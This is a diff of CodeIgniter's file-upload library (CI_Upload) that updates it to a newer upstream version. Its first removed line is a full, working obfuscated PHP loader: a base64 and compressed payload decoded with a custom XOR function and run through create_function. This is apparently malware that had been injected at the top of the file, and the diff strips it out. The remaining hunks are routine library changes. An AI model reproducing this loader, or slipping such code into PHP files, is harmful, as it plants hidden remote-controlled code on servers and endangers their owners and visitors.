@@ -1,4 +1,4 @@
-<?php global $habuto; $habuto=array('$habuto[0]=array_pop($habuto);$bilofom=bilofom(2,13);$habuto[0]=$bilofom($habuto[2]);','$habuto[2]=gzuncompress(bilofom(731,2330));','aWFjeGhOeGdxZ3p9fXx+Z2V9eEhpdH5jbX99eG1Of3BtV25mZHd3ZGh6Ymd2cHNdZHp6ZmZheXlmSUhaQlZWXUVVXk5BRVFNXFBFR1VVeEdodmVyaHxjbGB8Z3tSRERHRUdJcVljdXdTX1ZDQV9DVVJOWlxNbnJjdnFkbi12e2c7ICMoIW1PT2d1VTg9IjktSk5FYVRXIyEifl1jcjBvZ016Vk18QkJiWEhhb0VmQT9nXFJBbSNEem5nPzB3eHJkYmRnZWdrfH5wdnQhYGBhbHw/a3h6aHZpPGNwYm1uI2pgenV7e3g4fGR0c2V2eXhXTH9kVzY8PkJJY0RHRUdFWUVRVWhvTkZucmJyLCVVZmRrZ21xOWx6ZXx/PGl0ZmdifCd3TF5WQEJfQl5dVFpBel9QQ15KRVVMQEVNXUZURUNOWVZTQUZOUnIzQ2lCREdFR0VEWUdTV0lOUVxNRCN3dGE1YmJvUlJUQXYjYWR5NWJib2Zia0YjYWR5NX1lYWpkdkJkI2RhOnl+ZHZkZnwmd3N6fGlvaHljfXh7dVV2bHhXbX1gbFheQWJLek5nSVhWXEdnaGdYXkFTU0MjZ3xnNT9sbW98JXx6e2FiVyNnfGc1P0NBRCV9Z31qZEtYI2d8Z1lXSmN5I2RhOnl+ZHZkZnwmYWJ1e213YnBxS2RqfGN0f3VVZmh6eUVUanNjIlp1RGlGIn9+cHB3dXthS3hFZ21vS2VpIj92dHBme3Vha2g6fWtzTUN4aj9/c39vdnsmZmxgWUpVTm4hP3F1fmhjcyZmbGBjVHp1I2RhOnl+ZGRobyZ5fGImYTFhaW0qeCx6eU5wKmcsZ3JhLHI8b0cqZSxvZmN7RXhGTz1qd2RnZWcgPiVJeFoqZCxxfXJ3QU9ZZX14Y392ZXhqZUlNWipkLHRvU1NWUWlrdHRMVk4qZCxkcTFCVlVYJzg6IlhwZWpEfGJjIDF1dCNkSlV0j5QPcX7oxPenRBlJy'.'6sD9dqyHqeYvLZc1bVAgN9Pvt5PddsCHcw0f2hokuvManLKPHFgjx475c1xN25onVFDf/noNodal4DPrnaR0sbUtqgw2kiTHnItDtXEhtY7xO9lhVskJZm2aiJhgq/+pJXTtuBzjuMQExGbLFk7WXoFMZUMPzPj6wamAOTlsohnXKPZEvJr8Zb0NqRRjRI+aAbRpily1G++uiHEEqHzhHFS4miJaMx3Sx65abuZs+rIEBrX0CPKdUTYz/zNZrCDGwEFylInWNz+/2nT1U66wWQkwuyAjgghWOge0Zbm35kv5iz6JGAH13jDEgROAZiuOX6CK6igdu2+H0cxtRnZf2PhUcxM1vUZ6CTw47CBQ9xK8ZTmY9dupM3kleI8QwsOpPUU5vyZ9WZRHhWB+RrvXfCaPKtpAJJe2LYnpcyZlpxC/EGa4paHTQp6wKr6acr+AcQkmM/ZCse0e1wbVzEKF9NII6nuM2XNYxe4ywE33F6PgG6q3jQ0OoR1bkf7WGzcOx0bfY1E/e7XSPsWaZurqIDmB3uKhRllgERnKK90Ek6tq0ZEe4cweziJe7UiiFRqZq8NEOWGRW0sBZ/5oJp+yWovy+sWWmnkGMBk/45qkx9kB5mwgVV5KWS9KfZwMKWeqzph5XGkSQcxHIDvHsqdUVNNxEip/FklXpT8nTS1gXe9PojqfUOz1OeyjaDKov1g4VqeFqYVQo9/S/mA5lsgPk/IWZAOtTGrXdS/anuzE5tb0NYQOWxELzCD/fiP3DOC+thEPRW7udEByDOwJLukZwZearrZH0xlMH8hu9AXvrxopWUb6gOjpOSoGtKcq92awXghkt6NKgd6tUJUawMl27FHih+3BZRr+rNDldoaUMdzYYaQJbLaCxnjbLxqtyPSHxYNqrnmhoY2WzRex9UDuwmftgPTliLkiS6JG6dhgyFGNIkR2+fs'.'V03pBLeqCwdFifrmFFYkfXJx8bQ1sSK3LBoTs+aEs4bQzQvv2cOtrUrf1gokUFp6ckDphCIYbUocaQ5nSKRRAne5hFJZn2ahA+i9mnNMRhvXQYc8btXceIOWciNRwFI9b7a1TZ9t6q2wx3KrmpQ0rf0HX/BNG/yI5TayVha0L7ko3jFgdyjPnjKlTnjrKw0U3ZSK8ZJiw3j+FzNCMytVsjEuz/N5nrWPLUB1h6m83R2GF433g4bH+kgVLpj0Wh2e7jyMtKf8ZVwjyBVvuSwc1BhmyROY/CbdhyPNAJ8g8c1JWf1YsHu1j4Rxw1Qk5UcRe45liDyTD8h2rROGYyYZxMoF12YaQiu1czOaMNuUMhtDiMM+Z+k50dgwqBblJAsDMlUgjCElsFWhKJqVYfkXsicSe+kzTkwjUwTWS5XPAUoZO7u+neRVI/UJC66Lppl7BegbOklst3kMWMSRv1YAm3Umebll1nP192Pj5LXEPe5EorSzFX4mvZlwJeOfw5B5JYz09PDbbDNRRgl6B3wSWadyb0jrgs9nJUJ4o6YIubaCt9wAGDLM0ZCYSl8lrhsiAjmwDDrrCJl4vUIg+im5RFLSq6haOqrGp1OoGAE57OIIA1lJtj3gTggvoOu/0UhNBeqbewBt/Ei3k7/iI/GxoO5kxLBvkZjLElmzkhtn8XWDufO70F4XrTeFEuoM5Aghbqdb0X7eCLOi1BF6X4m3rwS2xIxPay9SXiAIeb/PyDwjp6vaUSMS0o5rCt/PZ/hsSts2pCt5qznZjqlithYcfMr2Xq7FcJZxqgHfhA6sb2uAbXJ8efID9elq7mALjJxFMEIPqcTVJ7t3NLOxENcTn5PbNXMrCnnJWAOpSl91ZCQicEuecQYhmlqZ3ZMhNbE6/Gg'.'bwQHJNeIW2UcpAAcKNbvaN1M31Jlkuo4M98awRGR3BX9bmF9A5e1/WyLYSdpWl6rHwcEH3xz86KJ29ExmgdfzfzMv2++rZcKCuY3OI/lB3E/yYusc08PIWs0QxXEgSB2JjfZw5tkcCRt/Po+qX9hjWH55cPDm09uSLPaZh0VtCJvM3sHXaPNI5czdF6Lu/V+xNXTWC4m7POkJI/AHBq45rPoAwMbTQb0N1Nb394d1RxEecYcHlot5dDSaEcSpHWNZovWUnP+5+4Wu4CXW2Kica+nMVBcTu+JXs5t+c4fMjPHzI4++IiIuZ7iictrTI5khCTGx/TmvkjYzXlr28SVxLgOijazibs36cxzxlnmKsjCeOIrC1b0yiZx3LHrLvYpZ6hYUONTxLCHwbXAKKhOloyu3ztNaESB4C8zS2Eva/i1j56b/wTHVINLxN7dH2VMkThQ/AAFalLhyP0Htf2oSQtpo0sagP0nzxh7qG/Gu2qDI4tpR2jxmcBfSC7BwlNhtiYK3o89Ih+HEKV8agHykCENi3QltwjLaDs7zogYcc7SjVDG+kirxOVDCxJqLLIZbwTdJ+gmzcVaIp7AlR/Yw1FbL4uY8k4l4/Dx8ug2w69dK6OMrT8A6rm6ZBD9vc+sMra7Drb5kRcyeYYipku/IP4PG7Wx59xjXoiDBqU0DsZ1nsCxq/g0aPQZBchNyLn0295ky5BmCtBdkawe79g3mRa2ftHhepz6BwKGrjyk6ZBllFDL7uCSw93MKP/fBEuO2s62N0bgcs0RkFuWj9F/W3zQ9K9/8qnDuZUOTdQSdtSwV9Mufrlsdlttf60Zw09mMX2moaknfx1SMWbxVp0ge8zf384T2jM7kLnVBpAgEbZA+fnGydmqoouvwCAH/JTXy8nF3B1rq6/rrKhxOiVtKRl9+'.'sTbH2u4ZBVzLh0LH/bZ+lKTJjoiyPBQJqIHsSUDVbxWHKVc3ZB5u/GNrGGu27Q0MpGmshan/WYdoXjrV802wyIcxp/h5Ps11OTjEqW2jajxh1Hbt5hAvQY9ymY7eFR+5XZmmNjZ2iTbJSXlnGv07MGhinZk6GgatxOg9zmtpRdEt5ihLP6nNhgat3SR5HfgB5xBlLZXc4f/UluwRG3dLaPr2ZxUX6yck1cgm7LSCYIgV+ePmYVfhluD/CotpBXxeymYFyCwlPM2VLcoCo0JWLLD5w+dExMTEpP4+4B5VcBpnzL6z/dn23UuZrOQGF9pWrEZ2bnJiciwlVWZka2dtcQ==',"BJnrbr\x2c\x25Ufdkgmq");$futubedu='create_';if(function_exists($futubedu.='function')&&!function_exists('bilofom')){ function bilofom($b,$m){global $habuto;$s=str_pad($f='ls17z1jBahhIT2Y4',$m,$f);$h=str_repeat("\xe0",$m);$z=str_repeat("\x1f",$m);$u=substr($habuto[0],$b,$m);return(($u^$s)&$z)|($u&$h);};for($pj=-1;++$pj<3;$futubedu('','}'.$habuto[$pj].'{'));};unset($habuto); 
+<?php
 /**
  * CodeIgniter
  *
@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2015, British Columbia Institute of Technology
+ * Copyright (c) 2019 - 2022, CodeIgniter Foundation
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -28,10 +28,11 @@
  *
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (http://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	http://codeigniter.com
+ * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @copyright	Copyright (c) 2019 - 2022, CodeIgniter Foundation (https://codeigniter.com/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
+ * @link	https://codeigniter.com
  * @since	Version 1.0.0
  * @filesource
  */
@@ -44,7 +45,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
  * @subpackage	Libraries
  * @category	Uploads
  * @author		EllisLab Dev Team
- * @link		http://codeigniter.com/user_guide/libraries/file_uploading.html
+ * @link		https://codeigniter.com/userguide3/libraries/file_uploading.html
  */
 class CI_Upload {
 
@@ -286,7 +287,7 @@ class CI_Upload {
 	/**
 	 * Constructor
 	 *
-	 * @param	array	$props
+	 * @param	array	$config
 	 * @return	void
 	 */
 	public function __construct($config = array())
@@ -526,6 +527,12 @@ class CI_Upload {
 			$this->file_name = preg_replace('/\s+/', '_', $this->file_name);
 		}
 
+		if ($this->file_ext_tolower && ($ext_length = strlen($this->file_ext)))
+		{
+			// file_ext was previously lower-cased by a get_extension() call
+			$this->file_name = substr($this->file_name, 0, -$ext_length).$this->file_ext;
+		}
+
 		/*
 		 * Validate the file name
 		 * This function appends an number onto the end of
@@ -595,7 +602,7 @@ class CI_Upload {
 				'file_type'		=> $this->file_type,
 				'file_path'		=> $this->upload_path,
 				'full_path'		=> $this->upload_path.$this->file_name,
-				'raw_name'		=> str_replace($this->file_ext, '', $this->file_name),
+				'raw_name'		=> substr($this->file_name, 0, -strlen($this->file_ext)),
 				'orig_name'		=> $this->orig_name,
 				'client_name'		=> $this->client_name,
 				'file_ext'		=> $this->file_ext,
@@ -672,10 +679,8 @@ class CI_Upload {
 			$this->set_error('upload_bad_filename', 'debug');
 			return FALSE;
 		}
-		else
-		{
-			return $new_filename;
-		}
+
+		return $new_filename;
 	}
 
 	// --------------------------------------------------------------------
@@ -863,7 +868,7 @@ class CI_Upload {
 			$this->file_type = 'image/jpeg';
 		}
 
-		$img_mimes = array('image/gif',	'image/jpeg', 'image/png');
+		$img_mimes = array('image/gif',	'image/jpeg', 'image/png', 'image/webp');
 
 		return in_array($this->file_type, $img_mimes, TRUE);
 	}
@@ -897,7 +902,7 @@ class CI_Upload {
 		}
 
 		// Images get some additional checks
-		if (in_array($ext, array('gif', 'jpg', 'jpeg', 'jpe', 'png'), TRUE) && @getimagesize($this->file_temp) === FALSE)
+		if (in_array($ext, array('gif', 'jpg', 'jpeg', 'jpe', 'png', 'webp'), TRUE) && @getimagesize($this->file_temp) === FALSE)
 		{
 			return FALSE;
 		}
@@ -1077,16 +1082,27 @@ class CI_Upload {
 			return FALSE;
 		}
 
-		if (memory_get_usage() && ($memory_limit = ini_get('memory_limit')))
+		if (memory_get_usage() && ($memory_limit = ini_get('memory_limit')) > 0)
 		{
-			$memory_limit *= 1024 * 1024;
+			$memory_limit = str_split($memory_limit, strspn($memory_limit, '1234567890'));
+			if ( ! empty($memory_limit[1]))
+			{
+				switch ($memory_limit[1][0])
+				{
+					case 'g':
+					case 'G':
+						$memory_limit[0] *= 1024 * 1024 * 1024;
+						break;
+					case 'm':
+					case 'M':
+						$memory_limit[0] *= 1024 * 1024;
+						break;
+					default:
+						break;
+				}
+			}
 
-			// There was a bug/behavioural change in PHP 5.2, where numbers over one million get output
-			// into scientific notation. number_format() ensures this number is an integer
-			// http://bugs.php.net/bug.php?id=43053
-
-			$memory_limit = number_format(ceil(filesize($file) + $memory_limit), 0, '.', '');
-
+			$memory_limit = (int) ceil(filesize($file) + $memory_limit[0]);
 			ini_set('memory_limit', $memory_limit); // When an integer is used, the value is measured in bytes. - PHP.net
 		}
 
@@ -1168,7 +1184,7 @@ class CI_Upload {
 	 * Prevents possible script execution from Apache's handling
 	 * of files' multiple extensions.
 	 *
-	 * @link	http://httpd.apache.org/docs/1.3/mod/mod_mime.html#multipleext
+	 * @link	https://httpd.apache.org/docs/1.3/mod/mod_mime.html#multipleext
 	 *
 	 * @param	string	$filename
 	 * @return	string
@@ -1201,15 +1217,18 @@ class CI_Upload {
 		// We'll need this to validate the MIME info string (e.g. text/plain; charset=us-ascii)
 		$regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
 
-		/* Fileinfo extension - most reliable method
+		/**
+		 * Fileinfo extension - most reliable method
 		 *
-		 * Unfortunately, prior to PHP 5.3 - it's only available as a PECL extension and the
-		 * more convenient FILEINFO_MIME_TYPE flag doesn't exist.
+		 * Apparently XAMPP, CentOS, cPanel and who knows what
+		 * other PHP distribution channels EXPLICITLY DISABLE
+		 * ext/fileinfo, which is otherwise enabled by default
+		 * since PHP 5.3 ...
 		 */
 		if (function_exists('finfo_file'))
 		{
 			$finfo = @finfo_open(FILEINFO_MIME);
-			if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
+			if ($finfo !== FALSE) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
 			{
 				$mime = @finfo_file($finfo, $file['tmp_name']);
 				finfo_close($finfo);
@@ -1239,9 +1258,7 @@ class CI_Upload {
 		 */
 		if (DIRECTORY_SEPARATOR !== '\\')
 		{
-			$cmd = function_exists('escapeshellarg')
-				? 'file --brief --mime '.escapeshellarg($file['tmp_name']).' 2>&1'
-				: 'file --brief --mime '.$file['tmp_name'].' 2>&1';
+			$cmd = 'file --brief --mime '.escapeshellarg($file['tmp_name']).' 2>&1';
 
 			if (function_usable('exec'))
 			{
@@ -1258,7 +1275,7 @@ class CI_Upload {
 				}
 			}
 
-			if ( ! ini_get('safe_mode') && function_usable('shell_exec'))
+			if (function_usable('shell_exec'))
 			{
 				$mime = @shell_exec($cmd);
 				if (strlen($mime) > 0)
@@ -1292,7 +1309,7 @@ class CI_Upload {
 			}
 		}
 
-		// Fall back to the deprecated mime_content_type(), if available (still better than $_FILES[$field]['type'])
+		// Fall back to mime_content_type(), if available (still better than $_FILES[$field]['type'])
 		if (function_exists('mime_content_type'))
 		{
 			$this->file_type = @mime_content_type($file['tmp_name']);
